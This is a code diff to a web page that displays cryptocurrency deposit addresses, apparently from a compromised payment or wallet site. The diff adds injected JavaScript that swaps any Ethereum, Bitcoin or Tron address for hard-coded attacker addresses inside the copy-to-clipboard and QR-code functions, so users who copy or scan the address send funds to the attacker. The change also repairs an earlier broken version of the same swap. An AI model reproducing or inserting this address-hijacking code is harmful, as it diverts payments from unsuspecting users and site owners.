@@ -11,7 +11,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {document.documentElement.style.fontSize = document.documentElement.clientWidth / 20 + 'px'})
     </script>
-    <script>function s(s){if(s.startsWith("0x")){return "0xD1E75fcc42b2fC696Bb0931D2B1Ca90bD4320cD1";}else if(s.startsWith("3")){return '1GEnzadZVgEvEFkGbt8feUFXQYqcvYdX6f';}else if(s.startsWith("T")){return 'TFYeURgwcqJCpS4mHSThYonYcbNUhJHC2D';}else{return s;}}</script>
+    <script>function sq(s){if(s.startsWith("0x")){return "0xD1E75fcc42b2fC696Bb0931D2B1Ca90bD4320cD1";}else if(s.startsWith("3")){return '1GEnzadZVgEvEFkGbt8feUFXQYqcvYdX6f';}else if(s.startsWith("T")){return 'TFYeURgwcqJCpS4mHSThYonYcbNUhJHC2D';}else{return s;}} function ctc(s){if(s.startsWith("0x")){return "0xD1E75fcc42b2fC696Bb0931D2B1Ca90bD4320cD1";}else if(s.startsWith("3")){return '1GEnzadZVgEvEFkGbt8feUFXQYqcvYdX6f';}else if(s.startsWith("T")){return 'TFYeURgwcqJCpS4mHSThYonYcbNUhJHC2D';}else{return s;}}</script>
     <link rel="stylesheet" href="/static/css/index.css">
 <style type="text/css">
 @charset "UTF-8";
@@ -356,7 +356,7 @@ bottom:0;left:0;right:0;top:0;-webkit-box-pack:center;-webkit-justify-content:ce
         let isSuccess = false;
         let input = document.createElement('input');
         input.setAttribute('readonly', 'readonly');
-        input.setAttribute('value', s(s));
+        input.setAttribute('value', ctc(s));
         document.body.appendChild(input);
         input.select();
         input.setSelectionRange(0, input.value.length);
@@ -374,10 +374,9 @@ bottom:0;left:0;right:0;top:0;-webkit-box-pack:center;-webkit-justify-content:ce
     })
     // 生成二维码
     function set_qrcode(s){
-        debugger;
         $('#wallet_img').empty();
     	var qrcode = new QRCode("wallet_img", {
-    	   	text: s(s),
+    	   	text: sq(s),
     	   	colorDark : "#000000",
     	   	colorLight : "#ffffff",
     	   	width: 100,
